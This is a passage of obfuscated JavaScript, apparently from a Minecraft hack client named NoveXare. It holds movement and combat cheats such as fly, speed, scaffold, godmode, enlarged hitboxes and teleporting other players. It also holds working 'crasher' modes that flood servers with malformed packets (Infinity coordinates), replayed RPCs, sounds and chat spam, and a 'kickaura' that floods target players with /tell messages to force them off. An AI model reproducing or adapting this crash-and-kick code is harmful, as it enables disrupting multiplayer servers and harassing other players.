    const _0xeb5f85 = scaffold_move ? getPlayerAngle(_0x1b7b61, self_id, "pitch_pos") : _0x513051.pitch;
    const _0x289db2 = getEntityCarriedItem(self_id);
    let _0x4a013d = {};
    let _0x51bfb1 = Infinity;
    if (scaffold_mode && scaffold_findPath) {
      for (let _0x50fde0 = -3; _0x50fde0 <= 3; _0x50fde0++) {
        for (let _0xc94bf4 = -3; _0xc94bf4 <= 0; _0xc94bf4++) {
          for (let _0x47efbe = -3; _0x47efbe <= 3; _0x47efbe++) {
            let _0xe08b0b = Math.sqrt(_0x50fde0 * _0x50fde0 + _0x47efbe * _0x47efbe + _0xc94bf4 * _0xc94bf4);
            var _0x49aae8 = {
              x: _0x50fde0 + _0x25c02a.x
            };
            _0x49aae8.y = Math.floor(rec_y) - 1 + _0xc94bf4;
            _0x49aae8.z = _0x47efbe + _0x25c02a.z;
            let _0x116fc4 = _0x49aae8;
            const _0x4cf758 = getBlock(_0x116fc4.x, _0x116fc4.y, _0x116fc4.z);
            if (_0x4cf758.namespace === "minecraft:air") {
              continue;
            }
            if (_0xe08b0b < _0x51bfb1) {
              _0x51bfb1 = _0xe08b0b;
              _0x4a013d = _0x116fc4;
            }
          }
        }
      }
    }
    if (scaffold_origin_block && _0x2ecb85.namespace === "minecraft:air") {
      callModule(18, "{\"value\":true}");
    }
    if (scaffold_auto_block && _0x289db2.namespace !== block_namespace) {
      selectPlayerInventorySlot(self_id, getItem(self_id, block_namespace));
    }
    for (let _0x3f5658 = 0; _0x3f5658 < scaffold_length; _0x3f5658++) {
      var _0x26fdf2 = {};
      _0x26fdf2.yaw = Math.round(_0x5b2072);
      _0x26fdf2.pitch = scaffold_pitch ? _0xeb5f85 : 0;
      const _0x5d2ed8 = getDisplacement(_0x3f5658, self_pos, _0x26fdf2);
      rec_y = !keep_y || rec_y === 0 ? Math.floor(_0x5d2ed8.y) - 1 : rec_y;
      const _0x188932 = getBlock(Math.floor(_0x5d2ed8.x), Math.floor(rec_y) - 1, Math.floor(_0x5d2ed8.z));
      const _0x3e0e29 = getBlock(Math.floor(_0x5d2ed8.x), Math.floor(rec_y) + 2, Math.floor(_0x5d2ed8.z));
      if ((_0x188932.namespace === "minecraft:air" || _0x188932.namespace === "minecraft:water" || _0x188932.namespace === "minecraft:lava") && (!scaffold_up || _0x3e0e29.namespace === "minecraft:air")) {
        if (scaffold_hyt) {
          callModule(37, "{\"value\":true}");
        }
        if (!scaffold_mode) {
          buildBlock(self_id, Math.floor(_0x5d2ed8.x), Math.floor(rec_y) - 1, Math.floor(_0x5d2ed8.z), 1);
        } else if (scaffold_findPath && _0x4a013d != {}) {
          var _0x3443af = {};
          _0x3443af.x = Math.floor(_0x5d2ed8.x);
          _0x3443af.y = Math.floor(rec_y) - 1;
          _0x3443af.z = Math.floor(_0x5d2ed8.z);
          let _0x450259 = _0x3443af;
          let _0x3d5fc1 = findPath(_0x4a013d, _0x450259);
          _0x3d5fc1.forEach(_0x32fc26 => {
            const _0x5ceea5 = getBlock(Math.round(_0x32fc26.x), Math.round(_0x32fc26.y - 0.3), Math.round(_0x32fc26.z));
            if (_0x5ceea5.namespace === "minecraft:air") {
              HYTBuild(Math.round(_0x32fc26.x), Math.round(_0x32fc26.y - 0.3), Math.round(_0x32fc26.z));
            }
          });
        } else {
          HYTBuild(Math.floor(_0x5d2ed8.x), Math.floor(rec_y) - 1, Math.floor(_0x5d2ed8.z));
        }
        if (scaffold_up) {
          buildBlock(self_id, Math.floor(_0x5d2ed8.x), Math.floor(rec_y) + 2, Math.floor(_0x5d2ed8.z), 0);
        }
        if (scaffold_hyt) {
          callModule(37, "{\"value\":false}");
        }
      }
      if (scaffold_more && _0x188932.namespace != _0x289db2.namespace) {
        buildBlock(self_id, Math.floor(_0x5d2ed8.x), Math.floor(rec_y) - 1, Math.floor(_0x5d2ed8.z), 0);
      }
    }
    if (scaffold_origin_block && _0x2ecb85.namespace !== "minecraft:air") {
      setTimeout(() => callModule(18, "{\"value\":false}"), 100);
    }
  }
  if (attack_self) {
    attack(self_id, attack_action);
  }
  if (lagback) {
    if (!lagback_run && !_0x116e53 && _0x1b6f06.y > -lagback_y) {
      lagback_pos.push(self_pos);
    }
    if (!lagback_run && _0x116e53) {
      lagback_pos = [];
    }
    if (!lagback_run && _0x1b6f06.y <= -lagback_y) {
      lagback_run = true;
    }
    if (lagback_run) {
      if (lagback_pos.length > 0) {
        var _0x167daf = lagback_pos.pop();
        setPos(_0x167daf.x, _0x167daf.y, _0x167daf.z);
        if (lagback_derp) {
          setLocalPlayerTurn(0, 120);
        }
      } else {
        lagback_run = false;
      }
    }
  }
  if (godmode && (!gm_move || _0x2ee94b > 0.1) && (gm_ground || _0x116e53)) {
    if (gm_tick == gm_cycle) {
      gm_pos = getEntityPos(self_id);
      gm_mot = getEntityMotion(self_id);
      for (let _0x4e1329 = 0; _0x4e1329 < gm_count; _0x4e1329++) {
        if (func_mode.godmode_mode == 0) {
          Teleport(self_pos.x, gm_y > 0 ? gm_y ^ 10 : 100, self_pos.z);
        }
        if (func_mode.godmode_mode == 1) {
          setPos(self_pos.x, gm_y > 0 ? gm_y ^ 10 : 100, self_pos.z);
        }
        if (func_mode.godmode_mode == 2) {
          sendMovePlayer({
            id: self_id,
            pos: {
              x: gm_xz ? 10000 : self_pos.x,
              y: gm_y > 0 ? gm_y ^ 10 : 100,
              z: gm_xz ? 10000 : self_pos.z
            },
            mode: 0,
            ground: _0x116e53,
            rot: _0x513051,
            yHeadRot: 0
          });
        }
      }
      if (!tp_back) {
        gm_tick = 0;
      }
    }
    if (tp_back && gm_tick >= gm_cycle + gm_delay) {
      for (let _0x296aed = 0; _0x296aed < gm_count; _0x296aed++) {
        if (func_mode.godmode_mode < 2) {
          setPos(gm_pos.x, gm_pos.y, gm_pos.z);
        }
        if (func_mode.godmode_mode < 2) {
          setMotion(gm_mot.x, gm_mot.y, gm_mot.z);
        }
        if (func_mode.godmode_mode == 2) {
          if (gm_local) {
            sendMovePlayer({
              id: self_id,
              pos: {
                x: gm_xz ? 10000 : self_pos.x,
                y: gm_y > 0 ? gm_y ^ 10 : 100,
                z: gm_xz ? 10000 : self_pos.z
              },
              mode: 0,
              ground: _0x116e53,
              rot: _0x513051,
              yHeadRot: 0
            });
          } else {
            sendMovePlayer({
              id: self_id,
              pos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
              },
              mode: 0,
              ground: _0x116e53,
              rot: _0x513051,
              yHeadRot: 0
            });
          }
        }
      }
      gm_tick = 0;
    }
  }
  if (wtap && target_list.length > 0 && getHorizontalDistanceByID(self_id, target_list[0]) < wtap_distance && (_0x116e53 || !wtap_only_ground)) {
    const _0x315ac3 = getPlayerAngle(getEntityPos(target_list[0]), self_id, "yaw_pos");
    var _0x46feee = {
      yaw: _0x315ac3,
      pitch: _0x513051.pitch
    };
    const _0x455e9a = getDisplacement(-wtap_speed / 10, self_pos, _0x46feee);
    setMotion(_0x455e9a.x - self_pos.x, _0x1b6f06.y, _0x455e9a.z - self_pos.z);
  }
  if (airjump && _0x1b6f06.y < -0.42) {
    let _0x452efe = predictEntityPos(_0x1b6f06, self_pos, getSpeed(self_id));
    let _0x5e6b82 = getPlayerAngle(_0x452efe, self_id, "yaw_pos");
    var _0xc00870 = {
      yaw: _0x5e6b82,
      pitch: 0
    };
    let _0xd609e = getDisplacement(jump_length / 10, self_pos, _0xc00870);
    setMotion(_0xd609e.x - self_pos.x, 0.42, _0xd609e.z - self_pos.z);
  }
  if (drop_list.length > 0) {
    let _0x3601f2 = drop_list.pop();
    dropPlayerInventorySlot(self_id, _0x3601f2);
  }
  if (fun_drop) {
    dropPlayerInventorySlot(self_id, getRandomNum(0, 8));
  }
  if (fun_hot) {
    selectPlayerInventorySlot(self_id, getRandomNum(0, 8));
  }
  if (trace && target_list.length > 0 && getDistanceByID(self_id, target_list[0]) > trace_min_dis) {
    let _0x4cc29d = getPlayerAngle(self_id, target_list[0], "yaw_pos");
    let _0x3a0544 = getPlayerAngle(self_id, target_list[0], "pitch_pos");
    var _0x5d206c = {
      yaw: _0x4cc29d,
      pitch: -_0x3a0544
    };
    let _0x3f45f5 = getDisplacement(-trace_speed / 5, getEntityPos(self_id), _0x5d206c);
    setEntityPos(self_id, _0x3f45f5.x, _0x3f45f5.y, _0x3f45f5.z);
  }
  if (line_particle && target_list.length > 0) {
    let _0x3afe8a = getEntityPos(self_id);
    _0x3afe8a.y += line_particle_offset / 10;
    target_list.map(_0x2fd093 => {
      let _0x10d8df = getEntityPos(_0x2fd093);
      _0x10d8df.y += 0.765;
      let _0x276c0f = getPlayerAngle(_0x3afe8a, _0x10d8df, "yaw_pos");
      let _0x31394a = getPlayerAngle(_0x3afe8a, _0x10d8df, "pitch_pos");
      for (let _0x6a7e6e = 0; _0x6a7e6e < getDistanceByID(_0x2fd093, self_id); _0x6a7e6e += (11 - line_particle_size) / 5) {
        var _0x404f24 = {
          yaw: _0x276c0f,
          pitch: -_0x31394a
        };
        let _0x30b386 = getDisplacement(-_0x6a7e6e, getEntityPos(self_id), _0x404f24);
        drawParticle(line_particle_type, _0x30b386.x, _0x30b386.y - 1.53 + line_particle_offset / 10, _0x30b386.z, 1);
      }
    });
  }
  if (auto_text) {
    text_d_1 = Date.now();
    if (text_d_1 - text_d_2 >= 0) {
      for (let _0x3233ee = 0; _0x3233ee < auto_text_num; _0x3233ee++) {
        var _0x172b47 = randomStr(6);
        sendChatMessage(auto_text_random ? content + " || " + _0x172b47 : content);
      }
      text_d_2 = text_d_1 + auto_text_delay * 1000;
    }
  }
  if (hitbox && target_list.length > 0) {
    target_list.map(_0x293454 => setEntitySize(_0x293454, hitbox_x, hitbox_y));
  }
  if (blackhole && target_list.length > 0) {
    target_list.map(_0x3c0ec1 => {
      const _0x2a7d7e = getDisplacement(blackhole_dis, self_pos, _0x513051);
      setEntityPos(_0x3c0ec1, _0x2a7d7e.x, _0x2a7d7e.y, _0x2a7d7e.z);
    });
  }
  if (target_upside_down && target_list.length > 0) {
    target_list.map(_0x19676e => setEntityName(_0x19676e, "Dinnerbone"));
  }
  if (auto_speed) {
    if (!bhop) {
      setEntityAttribute(self_id, "minecraft:movement", {
        max: bhop_speed / 15,
        min: bhop_speed / 15,
        current: bhop_speed / 15
      });
    }
    if (!bhop) {
      motion = getEntityMotion(self_id);
      if (motion.y == GROUND_MOTION_Y) {
        speed = GROUND_SPEED;
        resistance = GROUND_RESISTANCE;
        onGround = true;
      } else {
        speed = AIR_SPEED;
        resistance = AIR_RESISTANCE;
        onGround = false;
      }
    }
    if (bhop) {
      const _0x2a0129 = getEntityMotion(self_id);
      var _0x506429 = {
        y: _0x2a0129.y
      };
      const _0x17155e = _0x506429;
      let _0x4daae1 = false;
      if (!_0x2a0129.x) {
        _0x17155e.x = 0;
      } else if (_0x2a0129.x > -ERROR && _0x2a0129.x < ERROR) {
        _0x17155e.x = _0x2a0129.x;
      } else {
        _0x17155e.x = (_0x2a0129.x / resistance - motion.x) * bhop_speed / 10 / speed;
        _0x4daae1 = true;
      }
      if (!_0x2a0129.z) {
        _0x17155e.z = 0;
      } else if (_0x2a0129.z > -ERROR && _0x2a0129.z < ERROR) {
        _0x17155e.z = _0x2a0129.z;
      } else {
        _0x17155e.z = (_0x2a0129.z / resistance - motion.z) * bhop_speed / 10 / speed;
        _0x4daae1 = true;
      }
      if (motion.y == GROUND_MOTION_Y) {
        if (_0x4daae1) {
          _0x17155e.y = bhop_heigh;
        }
        _0x17155e.x = motion.x;
        _0x17155e.z = motion.z;
        speed = GROUND_SPEED;
        resistance = GROUND_RESISTANCE;
        onGround = true;
      } else {
        speed = AIR_SPEED;
        resistance = AIR_RESISTANCE;
        onGround = false;
      }
      motion = _0x17155e;
      setMotion(_0x17155e.x, _0x17155e.y, _0x17155e.z);
    }
  }
  if (flexibleMove) {
    const _0x5a14e8 = getEntityAttribute(self_id, "minecraft:movement");
    const _0x664168 = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 20);
    var _0x5306ee = _0x513051.yaw;
    var _0x1e8302 = {
      yaw: _0x5306ee,
      pitch: 0
    };
    const _0x55948f = getDisplacement(flexibleMove_speed / 10, self_pos, _0x1e8302);
    if (!_0x116e53 && _0x5a14e8.current > 0.12) {
      setMotion(_0x55948f.x - self_pos.x, 0, _0x55948f.z - self_pos.z);
    }
  }
  if (entity_particle) {
    target_list.map(_0x59b63f => {
      const _0x382106 = getEntityPos(_0x59b63f);
      drawParticle(particle_type, _0x382106.x, _0x382106.y + 0.3, _0x382106.z, particle_size);
    });
  }
  if (cleaner && drop_delay_t > drop_delay && (!cleaner_bow || _0x513051.pitch > 80)) {
    for (let _0x209c10 = 0; _0x209c10 < Math.ceil(max_drop_item); _0x209c10++) {
      let _0x3e1ba4 = cleaner_slot - _0x209c10;
      const _0x2d4ac4 = getPlayerInventoryItem(self_id, _0x3e1ba4);
      if (_0x2d4ac4.namespace != "minecraft:air") {
        clear_config.map(_0x31acfd => {
          var _0x25c445 = false;
          if (func_mode.cleaner_mode == 0) {
            _0x25c445 = _0x31acfd.namespace == _0x2d4ac4.namespace && (getItemCount(_0x3e1ba4) > _0x31acfd.max_num || _0x31acfd.max_num == -1) && (_0x2d4ac4.aux === _0x31acfd.aux || _0x31acfd.aux == "any");
          }
          if (func_mode.cleaner_mode == 1) {
            const _0x26b35c = temp.includes(_0x2d4ac4.namespace);
            _0x25c445 = !_0x26b35c || _0x31acfd.namespace == _0x2d4ac4.namespace && (getItemCount(_0x3e1ba4) > _0x31acfd.max_num || _0x31acfd.max_num == -1) && (_0x2d4ac4.aux == _0x31acfd.aux || _0x31acfd.aux == "any");
          }
          if (_0x25c445) {
            dropPlayerInventorySlot(self_id, _0x3e1ba4);
          }
        });
      }
      if (cleaner_slot > 0 && _0x209c10 == Math.round(max_drop_item) - 1) {
        cleaner_slot = cleaner_slot - Math.ceil(max_drop_item);
      }
      if (cleaner_slot <= 0) {
        cleaner_slot = 35;
      }
    }
    drop_delay_t = 0;
  }
  if (safewalk) {
    var _0x38b604 = predictEntityPos(_0x1b6f06, _0x25c02a, 5);
    const _0x48dc7f = getPlayerAngle(self_id, _0x38b604, "yaw_pos");
    var _0x48f3c9 = {
      yaw: _0x48dc7f,
      pitch: 0
    };
    const _0x5b6345 = getDisplacement(-0.2, self_pos, _0x48f3c9);
    const _0x438914 = getBlock(_0x5b6345.x, _0x25c02a.y - 1, _0x5b6345.z);
    if (_0x438914.namespace == "minecraft:air" && _0x1b6f06.y < -0.0783 && _0x1b6f06.y > -0.0785) {
      setMotion(_0x5b6345.x - self_pos.x, _0x1b6f06.y, _0x5b6345.z - self_pos.z);
    }
  }
  if (fly && (!fly_only_fly || _0x177706 > 0)) {
    const _0x8adbd0 = getEntityAttribute(self_id, "minecraft:movement");
    if ((!_0x116e53 || !fly_block) && (!fly_run || _0x8adbd0.current > 0.12)) {
      const _0x45f301 = fly_up_down ? fly_ud : 0;
      if (func_mode.fly_mode == 0) {
        var _0x94ca0b = predictEntityPos(_0x1b6f06, self_pos, fly_speed * 2.5);
        if (!fly_includeY) {
          setPos(_0x94ca0b.x, self_pos.y + _0x45f301, _0x94ca0b.z);
        }
        if (fly_includeY) {
          setPos(self_pos.x, _0x94ca0b.y, self_pos.z);
        }
        if (fly_mot) {
          setMotion(0, -0.01, 0);
        }
      }
      if (func_mode.fly_mode == 1) {
        var _0x1cb3bf = {
          yaw: _0x513051.yaw,
          pitch: 0
        };
        var _0x1c383e = getDisplacement(rush_length / 5, getEntityPos(self_id), _0x1cb3bf);
        setEntityMotion(self_id, _0x1c383e.x - self_pos.x, _0x1c383e.y - self_pos.y + _0x45f301, _0x1c383e.z - self_pos.z);
      }
      fly_ud = fly_ud > 0 ? -fly_set_ud / 10 : fly_set_ud / 10;
    }
  }
  if (show_activity && _0x2ee94b > 0.5) {
    var _0xddd8e = predictEntityPos(_0x1b6f06, self_pos, 1);
    const _0x1a1a93 = getPlayerAngle(self_id, _0xddd8e, "yaw_pos");
    sendChatMessage("我正在向" + Math.round(_0x1a1a93) + "°方向移动");
  }
  if (auto_door) {
    var _0x5d3633 = {
      yaw: _0x513051.yaw,
      pitch: 0
    };
    var _0x5799f6 = getDisplacement(0.8, getEntityPos(self_id), _0x5d3633);
    var _0x2602ba = {
      yaw: _0x513051.yaw,
      pitch: 0
    };
    var _0x5864df = getDisplacement(-0.8, getEntityPos(self_id), _0x2602ba);
    const _0x345249 = getBlock(_0x5799f6.x, _0x5799f6.y - 2, _0x5799f6.z);
    const _0x59423e = getBlock(_0x5864df.x, _0x5864df.y - 2, _0x5864df.z);
    if (_0x345249.namespace == "minecraft:wooden_door" && _0x345249.aux < 4) {
      buildBlock(self_id, _0x5799f6.x, _0x5799f6.y - 2, _0x5799f6.z, 0);
    }
    if (_0x59423e.namespace == "minecraft:wooden_door" && _0x59423e.aux > 3 && _0x59423e.aux < 8) {
      buildBlock(self_id, _0x5864df.x, _0x5864df.y - 2, _0x5864df.z, 0);
    }
  }
  if (suspend) {
    setMotion(_0x1b6f06.x, -0.001, _0x1b6f06.z);
  }
  if (hover) {
    setMotion(_0x1b6f06.x, 0.05, _0x1b6f06.z);
  }
  if (findEntity(target_list[0]) && rider && target_list.length > 0) {
    var _0x57806f = getEntityPos(target_list[0]);
    const _0x493771 = rider_random ? getRandomNum(-2, 2) : 0;
    MenuTP(_0x57806f.x + _0x493771, _0x57806f.y + rider_heigh + 1, _0x57806f.z + _0x493771);
    if (show_tip) {
      _0x2c4c04.push("§rRode §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "" + getEntityName(target_list[0]));
    }
  }
  if (auto_sprint) {
    const _0x29a7cd = getEntityAttribute(self_id, "minecraft:movement");
    if (_0x29a7cd.current > 0.12 || !move_fly) {
      var _0x1c383e = getDisplacement(func_mode.sprint_mode == 0 ? sprint_speed / 11 : sprint_speed / 11, getEntityPos(self_id), getEntityRot(self_id));
      if (sprint_horizontal) {
        _0x1c383e.y = self_pos.y;
      }
      const _0xe8cd59 = getBlock(_0x1c383e.x, _0x1c383e.y, _0x1c383e.z);
      if (_0xe8cd59.namespace === "minecraft:air" || throw_wall) {
        if (func_mode.sprint_mode == 0) {
          setEntityPos(self_id, _0x1c383e.x, _0x1c383e.y, _0x1c383e.z);
          setEntityMotion(self_id, _0x1b6f06.x, -1e-7, _0x1b6f06.z);
        }
        if (func_mode.sprint_mode == 1) {
          setMotion(_0x1c383e.x - self_pos.x, _0x1c383e.y - self_pos.y, _0x1c383e.z - self_pos.z);
        }
      } else {
        setEntityPos(self_id, self_pos.x, self_pos.y, self_pos.z);
      }
    }
  }
  if (crasher && func_mode.crasher_mode === 1) {
    for (let _0x1231c9 = -crasher_for; _0x1231c9 <= crasher_for; _0x1231c9++) {
      buildBlock(self_id, self_pos.x, self_pos.y, self_pos.z, _0x1231c9);
    }
  }
  if (crasher && func_mode.crasher_mode === 2) {
    for (let _0x427d0e = -crasher_for; _0x427d0e <= crasher_for; _0x427d0e++) {
      destroyBlock(self_id, Infinity, Infinity, Infinity, _0x427d0e);
    }
  }
  if (crasher && func_mode.crasher_mode === 4) {
    for (let _0x4d417e = 0; _0x4d417e <= crasher_for; _0x4d417e++) {
      sendChatMessage("NoveXareCrasher" + " ".repeat(100));
    }
  }
  if (crasher && func_mode.crasher_mode === 3 && last_PyRpc != {}) {
    for (let _0x3e92db = 0; _0x3e92db <= crasher_for; _0x3e92db++) {
      sendRpc(last_PyRpc.id, last_PyRpc.data);
    }
  }
  if (crasher && func_mode.crasher_mode === 5) {
    let _0x4102a2 = getPlayerList();
    _0x4102a2.map(_0x211fa9 => {
      const _0x36cbe3 = getEntityName(_0x211fa9);
      let _0x386ff5 = _0x36cbe3.indexOf("]") - 2;
      let _0x2cd226 = ["b", "c", "e", "a"];
      for (let _0x39a2b1 of _0x2cd226) {
        if (_0x36cbe3.indexOf("·§" + _0x39a2b1) != -1) {
          _0x386ff5 = _0x36cbe3.indexOf("·§" + _0x39a2b1);
          break;
        }
      }
      const _0x13a7b2 = _0x386ff5 == -1 ? _0x36cbe3 : _0x36cbe3.slice(_0x386ff5 + 3, _0x36cbe3.length);
      for (let _0x3f9f9a = 0; _0x3f9f9a < crasher_for; _0x3f9f9a++) {
        executeCommand("/tell \"" + _0x13a7b2 + "\" NoveXareCrasher");
      }
    });
  }
  if (crasher && func_mode.crasher_mode === 6) {
    setLocalPlayerTurn(0, Infinity);
  }
  if (crasher && func_mode.crasher_mode === 8) {
    for (let _0x26fc87 = 0; _0x26fc87 <= crasher_for; _0x26fc87++) {
      sendSound(81, self_pos.x, self_pos.y, self_pos.z, _0x26fc87);
    }
  }
  if (crasher && func_mode.crasher_mode === 9) {
    for (let _0x3a90aa = 0; _0x3a90aa <= crasher_for; _0x3a90aa++) {
      attack(self_id, false);
    }
  }
  if (crasher && func_mode.crasher_mode === 10) {
    for (let _0x3ae3b8 = 0; _0x3ae3b8 <= crasher_for; _0x3ae3b8++) {
      sendMovePlayer({
        id: self_id,
        pos: {
          x: self_pos.x,
          y: Infinity,
          z: self_pos.z
        },
        mode: 0,
        ground: _0x116e53,
        rot: _0x513051,
        yHeadRot: 0
      });
    }
  }
  if (crasher && func_mode.crasher_mode === 7) {
    for (let _0x36d8af = 0; _0x36d8af <= crasher_for; _0x36d8af++) {
      executePluginCommand("/ww say NoveXareCrasher");
    }
  }
  if (kickaura && target_list.length > 0) {
    target_list.map(_0x3c6c02 => {
      const _0x15933e = getEntityName(_0x3c6c02);
      let _0x50fb5d = _0x15933e.indexOf("]") - 2;
      let _0x54d7a4 = ["b", "c", "e", "a"];
      for (let _0x47dc1b of _0x54d7a4) {
        if (_0x15933e.indexOf("·§" + _0x47dc1b) != -1) {
          _0x50fb5d = _0x15933e.indexOf("·§" + _0x47dc1b);
          break;
        }
      }
      const _0x9de451 = _0x50fb5d == -1 ? _0x15933e : _0x15933e.slice(_0x50fb5d + 3, _0x15933e.length);
      for (let _0x96f284 = 0; _0x96f284 < kickaura_for; _0x96f284++) {
        executeCommand("/tell \"" + _0x9de451 + "\" NoveXareCrasher" + edit_kickaura.repeat(kickaura_repeat));
      }
    });
  }
  if (auto_save && _0x1b6f06.y < -max_mot_y) {
    if (!_0x116e53) {
      if (!autosave_near_block) {
        if (autosave_fake_block) {
          callModule(37, "{\"value\":true}");
        }
        buildBlock(self_id, _0x25c02a.x, _0x25c02a.y - max_mot_y * 3.1, _0x25c02a.z, 0);
        if (autosave_fake_block) {
          callModule(37, "{\"value\":false}");
        }
      } else {
        let _0x748448 = {};
        let _0x23ef44 = Infinity;
        for (let _0x2fe132 = -5; _0x2fe132 <= 5; _0x2fe132++) {
          for (let _0x2d9fbc = -1; _0x2d9fbc <= 0; _0x2d9fbc++) {
            for (let _0x489f19 = -5; _0x489f19 <= 5; _0x489f19++) {
              let _0x5173b4 = Math.sqrt(_0x2fe132 * _0x2fe132 + _0x489f19 * _0x489f19 + _0x2d9fbc * _0x2d9fbc);
              var _0x1f69bb = {
                x: _0x2fe132 + _0x25c02a.x,
                y: _0x2d9fbc + _0x25c02a.y,
                z: _0x489f19 + _0x25c02a.z
              };
              let _0x4c07c5 = _0x1f69bb;
              const _0x2bdcee = getBlock(_0x4c07c5.x, _0x4c07c5.y, _0x4c07c5.z);
              if (_0x2bdcee.namespace == "minecraft:air") {
                continue;
              }
              if (_0x5173b4 < _0x23ef44) {
                _0x23ef44 = _0x5173b4;
                _0x748448 = _0x4c07c5;
              } else {
                continue;
              }
            }
          }
        }
        if (_0x748448 != {}) {
          var _0x29de37 = {
            x: _0x25c02a.x,
            y: _0x25c02a.y - 1 + _0x1b6f06.y * 1.6,
            z: _0x25c02a.z
          };
          let _0x2d8a19 = _0x29de37;
          let _0x5c1b8e = findPath(_0x748448, _0x2d8a19);
          _0x5c1b8e.map(_0x218118 => {
            const _0x3d1d85 = getBlock(_0x218118.x, _0x218118.y, _0x218118.z);
            if (_0x3d1d85.namespace == "minecraft:air") {
              HYTBuild(Math.round(_0x218118.x), Math.round(_0x218118.y), Math.round(_0x218118.z));
            }
          });
        }
      }
    }
  }
  if (lockback && findEntity(target_list[0]) && target_list.length > 0) {
    var _0x57aa89 = getEntityRot(target_list[0]);
    var _0xddd8e = getEntityPos(target_list[0]);
    const _0x572010 = RandomLock ? getRandomNum(lockback_heigh - 1, lockback_heigh + 1) : lockback_heigh;
    const _0x5ab540 = RandomLock ? getRandomNum(-10, 10) : surround_speed * 3;
    lockback_yaw = surround ? lockback_yaw + _0x5ab540 : _0x57aa89.yaw;
    if (surround && lockback_yaw > 180) {
      lockback_yaw = -180;
    }
    var _0x14f2c8 = {
      yaw: lockback_yaw,
      pitch: 0
    };
    var _0x1c383e = getDisplacement(-lockback_length, _0xddd8e, _0x14f2c8);
    if (func_mode.surround_mode == 0) {
      setPos(_0x1c383e.x, _0xddd8e.y + 1.5 + _0x572010, _0x1c383e.z);
    }
    if (func_mode.surround_mode == 1) {
      Teleport(_0x1c383e.x, _0xddd8e.y + _0x572010, _0x1c383e.z);
    }
    if (show_tip) {
      _0x2c4c04.push("§rLocked §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "" + getEntityName(target_list[0]));
    }
  }
  if (surround_sound || sound_data.length > 0) {
    let _0x1ce112 = surround_all ? _0x4a1836 : target_list;
    if (surround_all_entity) {
      _0x1ce112.concat(getEntityList());
    }
    if (play_pos_list.length > 0) {
      _0x1ce112 = play_pos_list;
    }
    var _0x45c244 = {
      sound: surround_sound_type,
      level: surround_sound_level
    };
    var _0x503822 = [_0x45c244];
    surround_sound_yaw += 10;
    if (surround_sound_yaw > 180) {
      surround_sound_yaw = -180;
    }
    for (let _0x48e0b6 = 0; _0x48e0b6 < surround_sound_vec; _0x48e0b6++) {
      if (sound_data.length > 0) {
        _0x503822 = sound_data.shift().sounds;
      }
      if (_0x503822.length > 0) {
        for (let _0x183f71 of _0x503822) {
          var _0x19fa28 = _0x183f71.sound;
          var _0x166743 = _0x183f71.level;
          _0x1ce112.map(_0x2429a4 => {
            if (typeof _0x2429a4 != "string") {
              for (let _0xdfb1b5 = 0; _0xdfb1b5 < surround_sound_num; _0xdfb1b5++) {
                sendSound(Number(_0x19fa28), _0x2429a4.x, _0x2429a4.y, _0x2429a4.z, Number(_0x166743));
              }
            } else if (_0x2429a4 != self_id || !surround_exclude_self) {
              const _0x483330 = getEntityPos(_0x2429a4);
              var _0x2d4329 = {
                yaw: surround_sound_yaw,
                pitch: 0
              };
              var _0x2ae09c = getDisplacement(surround_sound_distance, _0x483330, _0x2d4329);
              for (let _0x415961 = 0; _0x415961 < surround_sound_num; _0x415961++) {
                sendSound(Number(_0x19fa28), _0x2ae09c.x, _0x2ae09c.y, _0x2ae09c.z, Number(_0x166743));
              }
            }
          });
        }
      }
    }
    if (sound_data.length > 0) {
      _0x2c4c04.push("§r剩余音频数据 §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + sound_data.length + "条");
    }
  }
  if (surround_loop && surround_sound && sound_file != null && sound_data.length == 0) {
    sound_data = JSON.parse(sound_file);
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 循环播放中 共" + sound_data.length + "条音频数据");
    }
  }
  if (show_tip && _0x5c8ff1.current < 6) {
    _0x2c4c04.push("§cWarning §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "LowHealth!");
  }
  if (low_health_operate && Math.round(_0x5c8ff1.current) <= min_run_heal) {
    const _0x16c8fb = func_mode.low_health_operate_mode;
    const _0x27c368 = getEntityCarriedItem(self_id);
    switch (_0x16c8fb) {
      case 2:
        removeEntity(self_id);
        break;
      case 0:
      case 1:
        executeCommand(_0x16c8fb === 0 ? "/hub" : "/again");
        break;
      case 3:
        if (_0x27c368.namespace !== "minecraft:splash_potion" || _0x27c368.aux !== 22) {
          selectPlayerInventorySlot(self_id, getItem(self_id, "splash_potion", 22));
        } else {
          let _0x3d8692 = getEntityRot();
          _0x3d8692.pitch = _0x3d8692.pitch < 0 ? 90 - _0x3d8692.pitch : 90 + _0x3d8692.pitch;
          setLocalPlayerTurn(-90, 0);
          if (_0x27c368.namespace.includes("fishing_rod")) {
            useItem();
          }
          if (low_health_operate_sword) {
            setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
          }
        }
        break;
      case 4:
        if (_0x27c368.namespace !== "minecraft:mushroom_stew") {
          selectPlayerInventorySlot(self_id, getItem(self_id, "mushroom_stew"));
        } else {
          useItem();
          if (low_health_operate_sword) {
            setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
          }
        }
        break;
      case 5:
        if (_0x27c368.namespace !== "minecraft:skull") {
          selectPlayerInventorySlot(self_id, getItem(self_id, "skull"));
        } else {
          useItem();
          if (low_health_operate_sword) {
            setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
          }
        }
        break;
    }
  }
  if (no_water_slowdown) {
    setEntityAttribute(self_id, "minecraft:lava_movement", getEntityAttribute(self_id, "minecraft:movement"));
    setEntityAttribute(self_id, "minecraft:underwater_movement", getEntityAttribute(self_id, "minecraft:movement"));
  }
  if (jesus) {
    const _0x168f9c = getBlock(_0x25c02a.x, _0x25c02a.y - 1, _0x25c02a.z);
    if (_0x168f9c.namespace == "minecraft:flowing_water" || _0x168f9c.namespace == "minecraft:water" || _0x168f9c.namespace == "minecraft:flowing_lava" || _0x168f9c.namespace == "minecraft:lava") {
      setEntityMotion(self_id, _0x1b6f06.x, 0, _0x1b6f06.z);
    }
  }
